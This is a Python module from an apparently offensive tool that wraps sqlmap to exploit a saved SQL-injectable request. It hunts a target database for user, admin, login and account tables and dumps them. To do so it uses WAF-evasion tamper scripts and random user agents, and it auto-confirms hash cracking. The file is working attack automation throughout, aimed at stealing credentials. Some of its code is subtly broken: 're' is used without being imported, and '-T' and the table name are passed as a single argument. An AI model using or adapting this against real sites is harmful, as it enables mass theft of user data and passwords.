#!/usr/bin/env python3
"""
G0BurpSQLmaPI - Users Dump Module
Dumps users and finds all tables containing user data
Author: nu11secur1ty
License: GPL-3.0
"""

import os
import sys
import json
import time
import shutil
import subprocess
from pathlib import Path

try:
    from colorama import init, Fore, Style
    init(autoreset=True, convert=True)
except Exception:
    class _C:
        def __getattr__(self, _): return ""
    Fore = Style = _C()

# ============================================================================
# PATHS
# ============================================================================

ROOT = Path.cwd()
MODULES_DIR = ROOT / "modules"
EXPLOIT_PATH = MODULES_DIR / "exploit.txt"
META_PATH = MODULES_DIR / "exploit_meta.json"
AUTH_PATH = MODULES_DIR / "auth_config.json"

# SQLMap configuration
SQLMAP_ENV_VAR = "G0_SQLMAP_PATH"
SQLMAP_DEFAULT_PATHS = [
    "D:/CVE/sqlmap-nu11secur1ty/sqlmap.py",
    "/usr/bin/sqlmap",
    "/usr/local/bin/sqlmap",
    "sqlmap.py",
]

# ============================================================================
# FUNCTIONS
# ============================================================================

def display_banner():
    """Display module banner"""
    print(Fore.CYAN + """
╔═══════════════════════════════════════════════════════════════╗
║                    👥 USERS DUMP MODULE                      ║
║           Find and dump ALL user tables in database          ║
║                   Author: nu11secur1ty                       ║
╚═══════════════════════════════════════════════════════════════╝
""" + Style.RESET_ALL)

def find_sqlmap():
    """Find sqlmap installation"""
    env_path = os.getenv(SQLMAP_ENV_VAR)
    if env_path:
        p = Path(env_path)
        if p.exists():
            return str(p)
    
    for path in SQLMAP_DEFAULT_PATHS:
        if Path(path).exists():
            return path
    
    for candidate in ("sqlmap.py", "sqlmap"):
        found = shutil.which(candidate)
        if found:
            return found
    return None

def load_exploit():
    """Load exploit file and parameters"""
    if not EXPLOIT_PATH.exists():
        print(Fore.RED + "❌ exploit.txt not found! Generate PoC first." + Style.RESET_ALL)
        return None, None
    
    try:
        vuln_params = []
        if META_PATH.exists():
            with open(META_PATH, 'r') as f:
                meta = json.load(f)
                vuln_params = meta.get("vuln_params", [])
        return EXPLOIT_PATH, vuln_params
    except Exception as e:
        print(Fore.RED + f"❌ Error loading exploit: {e}" + Style.RESET_ALL)
        return None, None

def find_all_user_tables(sqlmap_path, exploit_path, vuln_params):
    """
    Step 1: Find ALL tables that contain 'user' in the name
    """
    print(Fore.CYAN + "\n[+] Searching for ALL user tables..." + Style.RESET_ALL)
    
    # Build command to find user tables
    if sqlmap_path.endswith(".py"):
        cmd = [sys.executable, sqlmap_path]
    else:
        cmd = [sqlmap_path]
    
    cmd += [
        "-r", str(exploit_path),
        "--batch",
        "--flush-session",
        "--dbms=mysql",
        "--random-agent",
        "--level=3",
        "--risk=2",
        "--tamper=space2comment,between,charencode",
        "--sql-query=SELECT TABLE_NAME FROM information_schema.tables WHERE TABLE_SCHEMA=database() AND (TABLE_NAME LIKE '%user%' OR TABLE_NAME LIKE '%admin%' OR TABLE_NAME LIKE '%member%' OR TABLE_NAME LIKE '%login%' OR TABLE_NAME LIKE '%account%' OR TABLE_NAME LIKE '%profile%')",
    ]
    
    if vuln_params:
        cmd += ["-p", ",".join(vuln_params)]
    
    print(Fore.YELLOW + "[*] Finding tables containing: user, admin, member, login, account, profile" + Style.RESET_ALL)
    print(Fore.YELLOW + "[!] This may take a moment..." + Style.RESET_ALL)
    
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, check=False)
        output = result.stdout + result.stderr
        
        # Extract table names from output
        tables = []
        # Common patterns for table names in sqlmap output
        patterns = [
            r'Table: (\w+)',
            r'\|\s*(\w+)\s*\|',
            r'\[(\w+)\]',
            r'(\w+)\s+\([0-9]+ rows\)'
        ]
        
        for pattern in patterns:
            matches = re.findall(pattern, output)
            for match in matches:
                # Filter only user-related tables
                if any(keyword in match.lower() for keyword in ['user', 'admin', 'member', 'login', 'account', 'profile']):
                    if match not in tables and len(match) > 2:
                        tables.append(match)
        
        # Remove duplicates and sort
        tables = sorted(set(tables))
        
        if tables:
            print(Fore.GREEN + f"\n[+] Found {len(tables)} user-related tables:" + Style.RESET_ALL)
            for i, table in enumerate(tables, 1):
                print(Fore.CYAN + f"    {i}. {table}" + Style.RESET_ALL)
            return tables
        else:
            print(Fore.YELLOW + "\n[!] No user tables found. Trying common table names..." + Style.RESET_ALL)
            return ["users", "user", "admin", "members", "login", "accounts", "profiles", "user_accounts", "user_profiles"]
            
    except Exception as e:
        print(Fore.RED + f"❌ Error finding tables: {e}" + Style.RESET_ALL)
        return ["users", "user", "admin", "members", "login", "accounts"]

def dump_users_from_table(sqlmap_path, exploit_path, vuln_params, table_name):
    """
    Step 2: Dump users from a specific table
    """
    print(Fore.CYAN + f"\n[+] Dumping users from table: {table_name}" + Style.RESET_ALL)
    
    if sqlmap_path.endswith(".py"):
        cmd = [sys.executable, sqlmap_path]
    else:
        cmd = [sqlmap_path]
    
    cmd += [
        "-r", str(exploit_path),
        "--batch",
        "--flush-session",
        "--dbms=mysql",
        "--random-agent",
        "--level=3",
        "--risk=2",
        "--tamper=space2comment,between,charencode",
        "--dump",
        f"-T {table_name}",
        "--threads=10",
        "--timeout=30",
        "--retries=3",
        "--answers=crack=Y,dict=Y,continue=Y,quit=N",
    ]
    
    if vuln_params:
        cmd += ["-p", ",".join(vuln_params)]
    
    print(Fore.YELLOW + f"[*] Dumping ALL users from {table_name}..." + Style.RESET_ALL)
    print(Fore.YELLOW + "[!] Press Ctrl+C to skip this table" + Style.RESET_ALL)
    print("-" * 60)
    
    try:
        subprocess.run(cmd, check=False)
        print(Fore.GREEN + f"[+] Completed dumping {table_name}" + Style.RESET_ALL)
        return True
    except KeyboardInterrupt:
        print(Fore.YELLOW + f"\n[!] Skipped {table_name}" + Style.RESET_ALL)
        return False
    except Exception as e:
        print(Fore.RED + f"❌ Error dumping {table_name}: {e}" + Style.RESET_ALL)
        return False

def run_users_dump():
    """Main function - find and dump all user tables"""
    display_banner()
    
    # Check if exploit exists
    if not EXPLOIT_PATH.exists():
        print(Fore.RED + "❌ exploit.txt not found!" + Style.RESET_ALL)
        print(Fore.YELLOW + "Please generate PoC first using option 1 from main menu." + Style.RESET_ALL)
        input(Fore.CYAN + "\nPress Enter to exit..." + Style.RESET_ALL)
        return
    
    # Find sqlmap
    sqlmap_path = find_sqlmap()
    if not sqlmap_path:
        print(Fore.RED + "❌ sqlmap not found!" + Style.RESET_ALL)
        print(Fore.YELLOW + f"Set {SQLMAP_ENV_VAR} or install sqlmap." + Style.RESET_ALL)
        input(Fore.CYAN + "\nPress Enter to exit..." + Style.RESET_ALL)
        return
    
    # Load exploit
    exploit_path, vuln_params = load_exploit()
    if not exploit_path:
        input(Fore.CYAN + "\nPress Enter to exit..." + Style.RESET_ALL)
        return
    
    # Show configuration
    print(Fore.CYAN + "\n[*] Configuration:" + Style.RESET_ALL)
    print(f"    SQLMap: {sqlmap_path}")
    print(f"    Exploit: {exploit_path}")
    if vuln_params:
        print(f"    Parameters: {vuln_params}")
    print()
    
    # Confirm
    confirm = input(Fore.YELLOW + "Start FULL users dump? [Y/n]: " + Style.RESET_ALL).strip().lower()
    if confirm not in ("", "y", "yes"):
        print(Fore.YELLOW + "Cancelled." + Style.RESET_ALL)
        input(Fore.CYAN + "\nPress Enter to exit..." + Style.RESET_ALL)
        return
    
    # STEP 1: Find all user tables
    user_tables = find_all_user_tables(sqlmap_path, exploit_path, vuln_params)
    
    if not user_tables:
        print(Fore.RED + "❌ No user tables found!" + Style.RESET_ALL)
        input(Fore.CYAN + "\nPress Enter to exit..." + Style.RESET_ALL)
        return
    
    # Show found tables
    print(Fore.CYAN + "\n" + "="*60)
    print("FOUND USER TABLES:")
    print("="*60 + Style.RESET_ALL)
    for i, table in enumerate(user_tables, 1):
        print(f"{i}. {table}")
    print("="*60)
    
    # Ask which tables to dump
    dump_all = input(Fore.YELLOW + "\nDump ALL tables? [Y/n]: " + Style.RESET_ALL).strip().lower()
    
    tables_to_dump = []
    if dump_all in ("", "y", "yes"):
        tables_to_dump = user_tables
    else:
        print(Fore.CYAN + "Enter table numbers to dump (comma-separated, e.g., 1,3,5):" + Style.RESET_ALL)
        selection = input(Fore.YELLOW + "Selection: " + Style.RESET_ALL).strip()
        if selection:
            try:
                indices = [int(x.strip()) - 1 for x in selection.split(",") if x.strip()]
                tables_to_dump = [user_tables[i] for i in indices if 0 <= i < len(user_tables)]
            except:
                print(Fore.RED + "❌ Invalid selection." + Style.RESET_ALL)
                input(Fore.CYAN + "\nPress Enter to exit..." + Style.RESET_ALL)
                return
    
    if not tables_to_dump:
        print(Fore.YELLOW + "No tables selected." + Style.RESET_ALL)
        input(Fore.CYAN + "\nPress Enter to exit..." + Style.RESET_ALL)
        return
    
    # STEP 2: Dump users from each selected table
    print(Fore.CYAN + "\n" + "="*60)
    print(f"DUMPING {len(tables_to_dump)} USER TABLES")
    print("="*60 + Style.RESET_ALL)
    
    success_count = 0
    for i, table in enumerate(tables_to_dump, 1):
        print(Fore.CYAN + f"\n[{i}/{len(tables_to_dump)}] Processing: {table}" + Style.RESET_ALL)
        if dump_users_from_table(sqlmap_path, exploit_path, vuln_params, table):
            success_count += 1
    
    # Summary
    print(Fore.CYAN + "\n" + "="*60)
    print("USERS DUMP COMPLETE")
    print("="*60 + Style.RESET_ALL)
    print(Fore.GREEN + f"✅ Successfully dumped: {success_count}/{len(tables_to_dump)} tables" + Style.RESET_ALL)
    print(Fore.GREEN + f"📁 Output files saved in sqlmap output directory" + Style.RESET_ALL)
    print(Fore.YELLOW + "💡 Check sqlmap output for CSV files with user data" + Style.RESET_ALL)
    print("="*60)
    
    input(Fore.CYAN + "\nPress Enter to exit..." + Style.RESET_ALL)

# ============================================================================
# MAIN ENTRYPOINT
# ============================================================================

if __name__ == "__main__":
    run_users_dump()
